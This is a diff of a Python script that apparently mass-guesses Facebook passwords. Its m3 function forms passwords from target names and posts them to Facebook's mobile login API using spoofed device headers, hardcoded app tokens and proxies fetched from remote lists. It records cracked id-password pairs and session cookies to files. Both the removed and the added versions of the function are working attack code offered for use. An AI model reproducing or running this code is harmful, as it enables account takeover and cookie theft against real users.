@@ -1,6 +1,3 @@
-# FUCK BY SYED-ZADA
-# LKING PAID SCRIPT OPEN SOURCE 
-
 samsung = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H']
 import os
 os.system('clear')
@@ -36,15 +33,8 @@ def Setup():
 	except ValueError:exit()
 try:import httpx
 except:exit(' Found error in http module! ')
-xx=requests.get('https://raw.githubusercontent.com/Chigozieworldwide/XFORD/main/https.txt', 'https://raw.githubusercontent.com/Chigozieworldwide/XFORD/main/http.txt').text.splitlines()
-#xx=requests.get('https://raw.githubusercontent.com/NILL-XD/UAX/main/UAX.txt').text.splitlines()
-try:
-    proxies = requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text
-    open('proxies.txt', 'w').write(proxies)
-except Exception as e:
-    print('\x1b[1;95m[√] LOADING...')
-
-proxies = open('proxies.txt', 'r').read().splitlines()
+xx=requests.get('https://raw.githubusercontent.com/AKING110/files/main/ua.txt').text.splitlines()
+xnx=requests.get('https://raw.githubusercontent.com/ITACHI-143/XDXD/main/PROX').text.splitlines()
 def clear():
 	os.system('clear')
 	print(logo)
@@ -413,101 +403,36 @@ def m2(ids,names,passlist,fbcr):
 		time.sleep(20)
 	except Exception as e:
 		pass
-def m3(ids, names, passlist, fbcr):
-    global ok, loop, sim_id
-    try:
-        sys.stdout.write('\r\r\033[1;37m [RUNNING] [M3] \033[1;32m%s\033[1;37m| OK:\033[1;32m%s \033[1;37m' % (loop, len(oks)))
-        sys.stdout.flush()
-        fn = names.split(' ')[0]
-        try:
-            ln = names.split(' ')[1]
-        except:
-            ln = fn
-        for pw in passlist:
-            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace(
-                'Name', names).replace('name', names.lower())
-            ua = random.choice(xx)
-            head = {
-                "User-Agent": ua,
-                "Accept-Encoding": "gzip, deflate",
-                "Connection": "keep-alive",
-                "Content-Type": "application/x-www-form-urlencoded",
-                "Host": "graph.facebook.com",
-                "X-FB-Net-HNI": str(random.randint(3e7, 4e7)),
-                "X-FB-SIM-HNI": str(random.randint(2e4, 4e4)),
-                "X-FB-Connection-Type": "MOBILE.LTE",
-                "Authorization": "OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895",
-                "X-FB-Connection-Quality": "MOBILE.LTE",
-                "X-FB-Connection-Bandwidth": str(random.randint(3e7, 4e7)),
-                "X-Tigon-Is-Retry": "False",
-                "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62",
-                "x-fb-device-group": "5120",
-                "X-FB-Friendly-Name": "ViewerReactionsMutation",
-                "X-FB-Request-Analytics-Tags": "graphservice",
-                "X-FB-HTTP-Engine": "Liger",
-                "X-FB-Client-IP": "True",
-                "X-FB-Server-Cluster": "True",
-                "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62"
-            }
-            data = {
-                "adid": str(uuid.uuid4()),
-                "format": "json",
-                "device_id": str(uuid.uuid4()),
-                "cpl": "true",
-                "family_device_id": str(uuid.uuid4()),
-                "credentials_type": "device_based_login_password",
-                "error_detail_type": "button_with_disabled",
-                "source": "register_api",
-                "email": ids,
-                "password": pas,
-                "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
-                "generate_session_cookies": "1",
-                "meta_inf_fbmeta": "NO_FILE",
-                "advertiser_id": str(uuid.uuid4()),
-                "currently_logged_in_userid": "0",
-                "locale": "en_US",
-                "client_country_code": "US",
-                "method": "auth.login",
-                "fb_api_req_friendly_name": "authenticate",
-                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
-                "api_key": "882a8490361da98702bf97a021ddc14d"
-            }
-            proxy = random.choice(proxies)
-            proxies = {
-                "http": proxy,
-                "https": proxy
-            }
-            try:
-                po = requests.post('https://b-graph.facebook.com/auth/login', data=data, headers=head, proxies=proxies).json()
-                if "session_key" in po:
-                    token = po['access_token']
-                    print('\r\r\033[1;32m [NILL-OK] ' + ids + ' | ' + pas)
-                    oks.append(ids)
-                    open('/sdcard/NILL-XD/NILL-M3-OK.txt', 'a').write(ids + '|' + pas + '\n')
-                    session = po['session_cookies']
-                    cookie = ''
-                    cuser = session[0]
-                    cuser = session[0]['name'] + '=' + session[0]['value']
-                    cookie += cuser + ';'
-                    xs = session[1]['name'] + '=' + session[1]['value']
-                    cookie += xs + ';'
-                    fr = session[2]['name'] + '=' + session[2]['value']
-                    cookie += fr + ';'
-                    datr = session[3]['name'] + '=' + session[3]['value']
-                    cookie += datr + ';dpr=2;locale=en_US;wd=950x1835;'
-                    pagevoice = cuser.replace('c_user', 'm_page_voice')
-                    cookie += pagevoice
-                    open('/sdcard/NILL-XD/NILL-M3-OK-COKI.txt', 'a').write(ids + '|' + pas + '|' + cookie + '\n')
-                    break
-            except requests.exceptions.ConnectionError:
-                time.sleep(20)
-            except Exception as e:
-                pass
-        loop += 1
-    except requests.exceptions.ConnectionError:
-        time.sleep(20)
-    except Exception as e:
-        pass
+def m3(ids,names,passlist,fbcr):
+	try:
+		global ok,loop,sim_id
+		sys.stdout.write('\r\r\033[1;37m [RUNNING] [M3] \033[1;32m%s\033[1;37m| OK:\033[1;32m%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+		fn = names.split(' ')[0]
+		try:
+			ln = names.split(' ')[1]
+		except:
+			ln = fn
+		for pw in passlist:
+			pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
+			ua=random.choice(xx)
+			prox=random.choice(xnx)
+			#ua = "Dalvik/"+"2.0 (Linux; Android "+fbsv+"; "+model+" Build/"+build+"; wv) [FBAN/"+"FB4A;FBAV/"+fbsv+";FBPN/"+fbpn+";FBLC/"+"en_PK;FBBV/"+fbbv+";FBCR/"+fbcr+";FBMF/"+"samsung;FBBD/"+"samsung;FBDV/"+model+";FBSV/"+fbsv+";FBCA/"+"armeabi-v7a:armeabi;FBDM/"+"{density=1.7,width=720,height=1358};FB_FW/"+"1;FBRV/"+fbrv+";]"
+			head = {"User-Agent":ua,"Accept-Encoding":"gzip, deflate","Connection":"keep-alive","Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(3e7,4e7)),"X-FB-SIM-HNI":str(random.randint(2e4,4e4)),"X-FB-Connection-Type":"MOBILE.LTE","Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895","X-FB-Connection-Quality":"MOBILE.LTE","X-FB-Connection-Bandwidth":str(random.randint(3e7,4e7)),"X-Tigon-Is-Retry":"False","x-fb-session-id":"nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group":"5120","X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
+			data = {"adid":str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"register_api","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta":"NO_FILE","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"en_PK","client_country_code":"PK","method":"auth.login","fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
+			po = requests.post('https://b-graph.facebook.com/auth/login', data=data, headers=head, proxies=prox).json()
+			if "session_key" in po:
+				token = po['access_token']
+				print('\r\r\033[1;32m [NILL-OK] '+ids+' | '+pas)
+				oks.append(ids)
+				open('/sdcard/NILL-XD/NILL-M3-OK.txt','a').write(ids+'|'+pas+'\n')
+				session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
+				open('/sdcard/NILL-XD/NILL-M3-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
+				break
+		loop+=1
+	except requests.exceptions.ConnectionError:
+		time.sleep(20)
+	except Exception as e:
+		pass
 def rd(ids,passlist,fbcr):
 	try:
 		global ok,loop,sim_id
